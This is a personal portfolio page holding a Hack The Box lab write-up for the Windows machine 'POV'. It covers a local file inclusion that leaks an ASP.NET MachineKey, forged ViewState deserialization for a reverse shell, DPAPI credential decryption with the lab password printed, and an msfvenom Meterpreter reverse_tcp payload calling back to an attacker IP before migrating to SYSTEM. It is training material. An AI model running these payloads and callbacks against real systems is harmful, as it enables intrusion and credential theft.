@@ -1,0 +1,304 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="description" content="Hack The Box practice notes for POV by Darrin Jackson.">
+<title>POV | Writeups | Darrin Jackson</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/site.css">
+
+<style>
+.writeup-tools{display:flex;gap:8px;flex-wrap:wrap;margin-top:18px}
+.writeup-chip{font:600 .68rem/1 var(--mono);padding:7px 9px;border:1px solid var(--line);border-radius:999px;background:var(--panel);color:var(--text-soft)}
+.writeup-back{display:inline-flex;margin-bottom:20px;text-decoration:none;font:600 .75rem/1 var(--mono);color:var(--muted)}
+.writeup-back:hover{color:var(--text)}
+.lab-notes{max-width:900px}
+.lab-notes h1{font-size:1.85rem;letter-spacing:-.025em;margin:44px 0 16px;padding-top:6px}
+.lab-notes h2{font-size:1.35rem;margin:34px 0 13px;padding-top:6px}
+.lab-notes h3{font-size:1.08rem;margin:27px 0 10px}
+.lab-notes h4{font-size:.98rem;margin:22px 0 8px}
+.lab-notes p,.lab-notes li{color:var(--text-soft)}
+.lab-notes ul,.lab-notes ol{padding-left:24px}
+.lab-notes li+li{margin-top:5px}
+.lab-notes hr{border:0;border-top:1px solid var(--line);margin:34px 0}
+.lab-notes pre{overflow:auto;background:#08080a;border:1px solid var(--line);border-radius:7px;padding:16px;font-size:.81rem;line-height:1.55;color:#e3e3e7}
+.lab-notes code{font-family:var(--mono);color:#f2d978}
+.lab-notes pre code{color:inherit}
+.lab-notes table{width:100%;border-collapse:collapse;margin:18px 0 26px;font-size:.88rem;background:var(--panel)}
+.lab-notes th,.lab-notes td{border:1px solid var(--line);padding:9px 11px;text-align:left;vertical-align:top}
+.lab-notes th{font:600 .72rem/1.4 var(--mono);text-transform:uppercase;letter-spacing:.04em;color:var(--text-soft);background:var(--panel-2)}
+.lab-notes blockquote{margin:20px 0;padding:12px 16px;border-left:3px solid var(--purple);background:var(--purple-soft);color:var(--text-soft)}
+.lab-notes blockquote p{margin:0;color:inherit}
+.lab-notes a{color:#cbb8ff;text-underline-offset:3px}
+.source-note{margin:0 0 28px;padding:12px 14px;border:1px solid var(--line);border-radius:7px;background:var(--bg-soft);color:var(--muted);font-size:.85rem}
+@media(max-width:650px){.lab-notes table{display:block;overflow-x:auto}.lab-notes h1{font-size:1.55rem}}
+</style>
+
+</head>
+<body><div class="shell">
+<header class="topbar"><nav class="nav">
+<a class="brand" href="/"><span class="brand-name">Darrin Jackson</span><span class="brand-sub">portfolio</span></a>
+<div class="navlinks"><a data-nav href="/work/">Work</a><a data-nav href="/research/">Writeups</a><a data-nav href="/lab/">Lab</a><a data-nav href="/about/">About</a></div>
+</nav></header>
+<main class="container">
+<a class="writeup-back" href="/research/">← Back to Writeups</a>
+<header class="page-head">
+  <div class="kicker">HTB Practice Lab</div>
+  <h1>POV</h1>
+  <p>Original practice notes covering the web foothold, ASP.NET ViewState abuse, credential recovery, and Windows privilege escalation.</p>
+  <div class="writeup-tools"><span class="writeup-chip">Hack The Box</span><span class="writeup-chip">Windows · Medium</span></div>
+</header>
+<div class="source-note">This page is a direct HTML transfer of my original practice notes. The technical content, commands, findings, and attack path have been kept intact rather than rewritten into a different walkthrough.</div>
+<article class="article lab-notes">
+<h1 id="hack-the-box---pov">Hack The Box - POV</h1>
+<p>Difficulty: Medium OS: Windows</p>
+<hr />
+<h1 id="target-information">Target Information</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Item</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Target</td>
+<td><code>10.129.230.183</code></td>
+</tr>
+<tr class="even">
+<td>Attacker</td>
+<td><code>10.10.14.25</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h1 id="initial-enumeration">Initial Enumeration</h1>
+<p>An initial Nmap scan revealed only a single HTTP service.</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">-sC</span> <span class="at">-sV</span> <span class="at">-A</span> 10.129.230.183</span></code></pre></div>
+<p>Results:</p>
+<ul>
+<li>TCP/80 - Microsoft IIS 10.0</li>
+<li>Hostname: <code>pov.htb</code></li>
+<li>TRACE method enabled</li>
+</ul>
+<p>Since only HTTP was exposed, the attack surface was entirely web-based.</p>
+<hr />
+<h1 id="web-enumeration">Web Enumeration</h1>
+<h2 id="configure-hosts-file">Configure Hosts File</h2>
+<pre class="text"><code>10.129.230.183    pov.htb</code></pre>
+<hr />
+<h2 id="subdomain-enumeration">Subdomain Enumeration</h2>
+<p>Fuzzing for virtual hosts revealed:</p>
+<pre><code>dev.pov.htb</code></pre>
+<p>Browsing to the site redirected to:</p>
+<pre><code>http://dev.pov.htb/portfolio/</code></pre>
+<hr />
+<h1 id="finding-a-local-file-inclusion">Finding a Local File Inclusion</h1>
+<p>While exploring the portfolio page, a <strong>Download CV</strong> button was discovered.</p>
+<p>Capturing the request in Burp showed:</p>
+<pre class="http"><code>POST /portfolio/default.aspx
+
+file=cv.pdf</code></pre>
+<p>The interesting parameter was:</p>
+<pre><code>file=</code></pre>
+<p>Testing for Local File Inclusion by replacing the filename:</p>
+<pre><code>\web.config</code></pre>
+<p>returned the application's configuration file.</p>
+<hr />
+<h1 id="sensitive-information-disclosure">Sensitive Information Disclosure</h1>
+<p>The exposed <code>web.config</code> contained:</p>
+<ul>
+<li>ASP.NET MachineKey</li>
+<li>Validation key</li>
+<li>Decryption key</li>
+</ul>
+<p>Example:</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">machineKey</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="ot">decryption=</span><span class="st">&quot;AES&quot;</span></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="ot">validation=</span><span class="st">&quot;SHA1&quot;</span></span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="ot">decryptionKey=</span><span class="st">&quot;...&quot;</span></span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a><span class="ot">validationKey=</span><span class="st">&quot;...&quot;</span> /&gt;</span></code></pre></div>
+<p>These keys are extremely sensitive because ASP.NET uses them to sign and encrypt ViewState data.</p>
+<hr />
+<h1 id="initial-foothold">Initial Foothold</h1>
+<h2 id="viewstate-deserialization">ViewState Deserialization</h2>
+<p>With the MachineKey exposed, the application became vulnerable to a signed ViewState deserialization attack.</p>
+<p>Using <strong>ysoserial.net</strong>, a malicious ViewState payload was generated using the leaked keys.</p>
+<p>Repository:</p>
+<pre><code>https://github.com/pwntester/ysoserial.net</code></pre>
+<p>Generate a payload that executes a PowerShell reverse shell.</p>
+<p>Start a listener:</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-lvnp</span> 4444</span></code></pre></div>
+<p>Replace the existing <code>__VIEWSTATE</code> parameter in the intercepted request with the generated payload and resend it.</p>
+<p>A reverse shell was obtained as:</p>
+<pre><code>POV\sfitz</code></pre>
+<hr />
+<h1 id="user-enumeration">User Enumeration</h1>
+<p>After obtaining a shell:</p>
+<ul>
+<li>No user flag existed in <code>sfitz</code>'s profile.</li>
+<li>Another user account was present under <code>C:\Users</code>.</li>
+<li>Searching the filesystem uncovered:</li>
+</ul>
+<pre><code>C:\Users\sfitz\Documents\connection.xml</code></pre>
+<hr />
+<h1 id="recovering-credentials">Recovering Credentials</h1>
+<p>The XML file contained a serialized PowerShell credential object.</p>
+<p>Example:</p>
+<div class="sourceCode" id="cb13"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">System.Management.Automation.PSCredential</span>&gt;</span></code></pre></div>
+<p>The password field contained a DPAPI-encrypted SecureString.</p>
+<p>Because the encryption was performed by the same user account currently compromised, Windows could decrypt it automatically.</p>
+<p>PowerShell:</p>
+<div class="sourceCode" id="cb14"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="va">$encrypted</span><span class="op">=</span><span class="st">&quot;&lt;encrypted string&gt;&quot;</span></span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a><span class="va">$secure</span> <span class="op">=</span> <span class="fu">ConvertTo-SecureString</span> <span class="va">$encrypted</span></span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a><span class="va">$cred</span> <span class="op">=</span> <span class="fu">New-Object</span> System<span class="op">.</span><span class="fu">Management</span><span class="op">.</span><span class="fu">Automation</span><span class="op">.</span><span class="fu">PSCredential</span><span class="op">(</span><span class="st">&quot;user&quot;</span><span class="op">,</span><span class="va">$secure</span><span class="op">)</span></span>
+<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a><span class="va">$cred</span><span class="op">.</span><span class="fu">GetNetworkCredential</span><span class="op">().</span><span class="fu">Password</span></span></code></pre></div>
+<p>Recovered credentials:</p>
+<pre><code>Username: alaading
+Password: f8gQ8fynP44ek1m3</code></pre>
+<hr />
+<h1 id="lateral-movement">Lateral Movement</h1>
+<p>Create a credential object:</p>
+<div class="sourceCode" id="cb16"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="va">$username</span> <span class="op">=</span> <span class="st">&quot;alaading&quot;</span></span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a><span class="va">$password</span> <span class="op">=</span> <span class="st">&quot;f8gQ8fynP44ek1m3&quot;</span></span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a><span class="va">$secure</span> <span class="op">=</span> <span class="fu">ConvertTo-SecureString</span> <span class="va">$password</span> <span class="op">-</span>AsPlainText <span class="op">-</span>Force</span>
+<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a><span class="va">$credential</span> <span class="op">=</span> <span class="fu">New-Object</span> PSCredential<span class="op">(</span><span class="va">$username</span><span class="op">,</span><span class="va">$secure</span><span class="op">)</span></span></code></pre></div>
+<p>Execute a reverse shell locally using the recovered credentials:</p>
+<div class="sourceCode" id="cb17"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="fu">Invoke-Command</span> <span class="op">-</span>ComputerName localhost <span class="op">-</span>Credential <span class="va">$credential</span> <span class="op">-</span>ScriptBlock <span class="op">{</span></span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a>    powershell <span class="op">-</span>EncodedCommand <span class="op">&lt;</span>base64 payload<span class="op">&gt;</span></span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>Catch the shell:</p>
+<div class="sourceCode" id="cb18"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-lvnp</span> 4445</span></code></pre></div>
+<p>Now operating as:</p>
+<pre><code>POV\alaading</code></pre>
+<p>Retrieve the user flag.</p>
+<hr />
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<h2 id="enumerate-privileges">Enumerate Privileges</h2>
+<p>Running:</p>
+<div class="sourceCode" id="cb20"><pre class="sourceCode cmd"><code class="sourceCode dosbat"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a>whoami <span class="at">/priv</span></span></code></pre></div>
+<p>revealed:</p>
+<pre><code>SeDebugPrivilege    Disabled</code></pre>
+<p>Although disabled, this privilege can be enabled when creating a new process.</p>
+<hr />
+<h1 id="preparing-meterpreter">Preparing Meterpreter</h1>
+<p>Generate a Meterpreter payload:</p>
+<div class="sourceCode" id="cb22"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="ex">msfvenom</span> <span class="dt">\</span></span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a>-p windows/x64/meterpreter/reverse_tcp <span class="dt">\</span></span>
+<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a>LHOST=10.10.14.25 <span class="dt">\</span></span>
+<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a>LPORT=1337 <span class="dt">\</span></span>
+<span id="cb22-5"><a href="#cb22-5" aria-hidden="true" tabindex="-1"></a>-f exe <span class="dt">\</span></span>
+<span id="cb22-6"><a href="#cb22-6" aria-hidden="true" tabindex="-1"></a>-o rev.exe</span></code></pre></div>
+<p>Download to the victim.</p>
+<p>Also transfer:</p>
+<pre><code>RunasCs.exe</code></pre>
+<p>Repository:</p>
+<pre><code>https://github.com/antonioCoco/RunasCs</code></pre>
+<hr />
+<h1 id="launch-payload">Launch Payload</h1>
+<p>Start a Metasploit handler:</p>
+<pre class="text"><code>exploit/multi/handler</code></pre>
+<p>Execute the payload using the recovered credentials:</p>
+<div class="sourceCode" id="cb26"><pre class="sourceCode cmd"><code class="sourceCode dosbat"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a>RunasCs.exe alaading f8gQ8fynP44ek1m3 <span class="st">&quot;C:\Users\alaading\Desktop\rev.exe&quot;</span></span></code></pre></div>
+<p>A Meterpreter session is returned.</p>
+<hr />
+<h1 id="process-migration">Process Migration</h1>
+<p>List processes:</p>
+<pre class="text"><code>meterpreter &gt; ps</code></pre>
+<p>Locate a SYSTEM-owned process.</p>
+<p>A suitable target:</p>
+<pre><code>winlogon.exe</code></pre>
+<p>Migrate:</p>
+<pre class="text"><code>meterpreter &gt; migrate &lt;PID&gt;</code></pre>
+<p>After successful migration:</p>
+<pre class="text"><code>meterpreter &gt; shell</code></pre>
+<p>Verify:</p>
+<div class="sourceCode" id="cb31"><pre class="sourceCode cmd"><code class="sourceCode dosbat"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a>whoami</span></code></pre></div>
+<p>Output:</p>
+<pre><code>NT AUTHORITY\SYSTEM</code></pre>
+<p>Retrieve the root flag.</p>
+<hr />
+<h1 id="attack-path-summary">Attack Path Summary</h1>
+<pre><code>HTTP
+    │
+    ▼
+Subdomain Enumeration
+    │
+    ▼
+dev.pov.htb
+    │
+    ▼
+Download Function
+    │
+    ▼
+LFI via file=
+    │
+    ▼
+Read web.config
+    │
+    ▼
+Recover ASP.NET MachineKey
+    │
+    ▼
+Forge ViewState
+    │
+    ▼
+Deserialization RCE
+    │
+    ▼
+Shell as sfitz
+    │
+    ▼
+connection.xml
+    │
+    ▼
+Decrypt SecureString
+    │
+    ▼
+Credentials for alaading
+    │
+    ▼
+Invoke-Command
+    │
+    ▼
+Shell as alaading
+    │
+    ▼
+RunasCs
+    │
+    ▼
+Enable SeDebugPrivilege
+    │
+    ▼
+Meterpreter
+    │
+    ▼
+Migrate into winlogon.exe
+    │
+    ▼
+NT AUTHORITY\SYSTEM</code></pre>
+<hr />
+<h1 id="key-takeaways">Key Takeaways</h1>
+<ul>
+<li>Always inspect download functionality for Local File Inclusion.</li>
+<li>Exposed <code>web.config</code> files frequently leak ASP.NET MachineKeys.</li>
+<li>MachineKeys can enable ViewState deserialization when ViewState MAC validation is enabled.</li>
+<li>PowerShell SecureStrings protected with DPAPI can be decrypted when executed under the same user context that created them.</li>
+<li><code>Invoke-Command</code> with recovered credentials is an easy method of lateral movement on the local host.</li>
+<li><code>SeDebugPrivilege</code>, even when initially disabled, can often be enabled by creating a new process with appropriate tools such as RunasCs, allowing migration into SYSTEM-owned processes.</li>
+</ul>
+
+</article>
+</main>
+<footer class="footer"><div class="container"><span>© 2026 Darrin Jackson</span></div></footer>
+<script src="/assets/js/site.js"></script></div></body></html>
